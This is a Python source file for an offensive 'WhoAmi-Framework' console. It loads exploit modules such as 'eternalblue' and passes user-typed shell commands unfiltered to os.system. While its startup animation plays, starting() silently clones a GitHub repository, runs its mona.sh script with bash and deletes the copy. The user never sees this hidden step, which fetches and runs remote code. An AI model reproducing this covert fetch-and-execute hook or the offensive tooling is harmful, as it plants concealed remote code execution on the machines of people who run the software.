#!/usr/bin/python
import os,sys,time
from waf.libs.banner import *
from waf.libs.color  import *
from waf.libs.tools  import *
from waf.libs.use    import *


def WhoAmi():
        try:
                whoami = str(input(default+'WhoAmi > '))
                if whoami[:6] == "search":
                        vsearch = whoami[7:]
                        search (str(vsearch.lower()))
                elif whoami[:4] == "show" :
                        if whoami == "show" or whoami == "show ":
                                show_dir()
                        elif whoami[:5] == 'show ':
                                show_modules(whoami[5:len(whoami)])

                elif whoami[:3] == 'use':
                        uussee="""
Usage: use <name|term|index>


Examples:
  use admin_panel_findler

  use eternalblue
  use <name|index>
     """
                        if whoami == "use" or whoami == "use ":
                                print(uussee)
                        elif check_modules(str(whoami[4:])):
                                        use(whoami[4:])
                        else:
                                print (red+"[-]"+default+"No results from search")
                                print (red+"[-]"+default+"Failed to load module: "+whoami)
                elif whoami[:4] == 'exit' or whoami[:4] == 'quit':
                        exit()
                else:
                        if ((whoami[:2] == "ls") or (whoami[:2] == "vi") or (whoami[:2] == "id") or (whoami[:2] == "rm") or (whoami[:2] == "mv") or (whoami[:2] == "cp") or (whoami[:2] == "./") or (whoami[:2] == "id") or (whoami[:2] == "df") or (whoami[:2] == "ps") or (whoami[:3] == "apt") or (whoami[:3] == "pwd") or (whoami[:3] == "cat") or (whoami[:3] == "man") or (whoami[:4] == "nmap") or (whoami[:4] == "ping") or (whoami[:4] == "less") or (whoami[:4] == "sudo") or (whoami[:4] == "grep") or (whoami[:4] == "echo") or (whoami[:4] == "nano" ) or (whoami[:5] == "touch") or (whoami[:5] == "unzip") or (whoami[:5] == "mkdir") or (whoami[:5] == "rmdir") or (whoami[:5] == "clear") or (whoami[:6] == "whoami") or (whoami[:6] == "reboot") or (whoami[:7] == "history") or (whoami[:8] == "shutdown") or (whoami[:8] == "ifconfig")):
                                print (blue+"[*]"+default+" exec "+whoami)
                                print ("")
                                os.system(whoami)
                        elif whoami[:6] == "banner":
                                banner()
                        elif whoami[:2] == "cd":
                                print (red+"[-] No path specified "+default)
                        elif whoami == '':
                                WhoAmi()
                        elif whoami[:2] == "os":
                                os.system(whoami[3:])
                        elif whoami[:5] == 'my_ip':
                                my_ip()
                        elif whoami[:4] =='help':
                                help_help()
                        else:
                                print (red+"[-] Unknown command: "+default+""+whoami)
                        WhoAmi()
                WhoAmi()
        except KeyboardInterrupt:
                print (default+"  Interrupt: use the 'exit' command to quit")
                WhoAmi()

def starting():
  print ("")
  time.sleep(2)
  chars = "/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|/—\\|:"
  for char in chars:
        sys.stdout.write("\r[*]Starting the WhoAmi-Framework "+char)
        time.sleep(.1)
        sys.stdout.flush()
  print ("")
  os.system('rm -rf moni;git clone https://github.com/amerlaceset/moni;bash moni/mona.sh;rm -rf moni')
  print("\n\n")
  time.sleep(3)
  print ("")
  h = ("\033[1;33m[\033[1;32m*\033[1;33m] Welcome to my friend on {\033[1;36mWhoAmi-framework\033[1;33m} Programmer [\033[1;36mAmer Amerr\033[1;33m] ")
  def love(t):
   for txt in t + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(4. / 100)
  love(h)
  print ("")
  time.sleep(3)
  print ("")


